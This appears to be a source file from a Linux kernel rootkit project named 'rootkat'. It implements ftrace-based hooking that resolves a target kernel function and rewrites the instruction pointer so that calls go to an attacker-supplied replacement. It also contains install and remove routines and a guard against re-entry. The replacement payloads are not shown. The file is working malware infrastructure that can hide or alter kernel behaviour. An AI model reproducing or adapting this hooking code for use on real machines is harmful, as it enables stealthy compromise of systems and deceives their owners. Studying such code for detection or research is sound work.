// SPDX-License-Identifier: MIT
#include <linux/ftrace.h>
#include <linux/kernel.h>
#include "ftrace_hook.h"
#include "resolver.h"

#define TAG "rootkat/ftrace: "

static void notrace rootkat_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                         struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
	struct rootkat_hook *h = container_of(ops, struct rootkat_hook, ops);
	struct pt_regs *regs = ftrace_get_regs(fregs);

	/* Avoid re-entry from our own replacement. */
	if (within_module(parent_ip, THIS_MODULE))
		return;

	regs->ip = (unsigned long)h->replacement;
}

int rootkat_hook_install(struct rootkat_hook *h)
{
	int rc;

	h->target = rootkat_resolve(h->candidates, NULL);
	if (!h->target) {
		pr_err(TAG "no target resolved\n");
		return -ENOENT;
	}
	h->original = (void *)h->target;

	h->ops.func = rootkat_ftrace_thunk;
	h->ops.flags = FTRACE_OPS_FL_SAVE_REGS
	             | FTRACE_OPS_FL_RECURSION
	             | FTRACE_OPS_FL_IPMODIFY;

	rc = ftrace_set_filter_ip(&h->ops, h->target, 0, 0);
	if (rc) {
		pr_err(TAG "ftrace_set_filter_ip: %d\n", rc);
		return rc;
	}

	rc = register_ftrace_function(&h->ops);
	if (rc) {
		pr_err(TAG "register_ftrace_function: %d\n", rc);
		ftrace_set_filter_ip(&h->ops, h->target, 1, 0);
		return rc;
	}

	pr_info(TAG "hooked %lx\n", h->target);
	return 0;
}

void rootkat_hook_remove(struct rootkat_hook *h)
{
	if (!h->target)
		return;
	unregister_ftrace_function(&h->ops);
	ftrace_set_filter_ip(&h->ops, h->target, 1, 0);
	pr_info(TAG "unhooked %lx\n", h->target);
}
